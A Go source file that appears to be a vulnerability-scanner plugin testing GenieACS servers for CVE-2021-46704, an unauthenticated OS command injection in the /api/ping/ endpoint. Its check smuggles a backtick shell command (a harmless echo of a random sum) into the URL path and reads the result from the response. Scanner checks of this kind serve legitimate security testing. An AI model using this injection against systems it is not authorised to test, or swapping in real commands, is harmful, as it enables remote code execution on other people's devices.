package goplugin

import (
	"Yscanner/utils"
	"fmt"
	"net/http"
	"strconv"
	"strings"

	"github.com/opensec-cn/kunpeng/util"
)

func init() {
	Register("genieACS_cve_2021_46704", &genieACS_cve_2021_46704{})
}

type genieACS_cve_2021_46704 struct{}

func (p *genieACS_cve_2021_46704) Info() PluginInfo {
	return PluginInfo{
		Name:     "GenieACS api ping 远程命令执行漏洞（CVE-2021-46704）",
		VulnInfo: "GenieACS是一款高性能自动配置服务器 (ACS)，用于远程管理启用 TR-069 的设备。GenieACS 1.2.8之前的版本 存在安全漏洞，该漏洞源于输入验证不足以及缺少授权检查造成的，UI接口API很容易通过ping主机参数进行未经身份验证的OS命令注入的攻击。",
		VulnID:   "CVE-2021-46704",
		Level:    "9.8 CRITICAL",
		URL:      "https://xz.aliyun.com/t/11722",
		Version:  "1.2.0 <= GenieACS < 1.2.8",
		CWE:      "CWE-78	OS命令注入",
	}
}

func (p *genieACS_cve_2021_46704) Check(netloc string) bool {
	rand1 := utils.GenRandomInt(5)
	rand2 := utils.GenRandomInt(5)
	payload := fmt.Sprintf("echo%%20%%22$(expr%%20%d%%20+%%20%d)%%22", rand1, rand2)

	req_check, err := http.NewRequest("GET", netloc+"/api/ping/;`"+payload+"`", nil)
	if err != nil {
		return false
	}
	resp_check, err := util.RequestDo(req_check, true, 2)
	if err != nil {
		return false
	}

	if resp_check.Other.StatusCode == 500 && strings.Contains(resp_check.ResponseRaw, strconv.Itoa(rand1+rand2)) {
		return true
	}
	return false
}
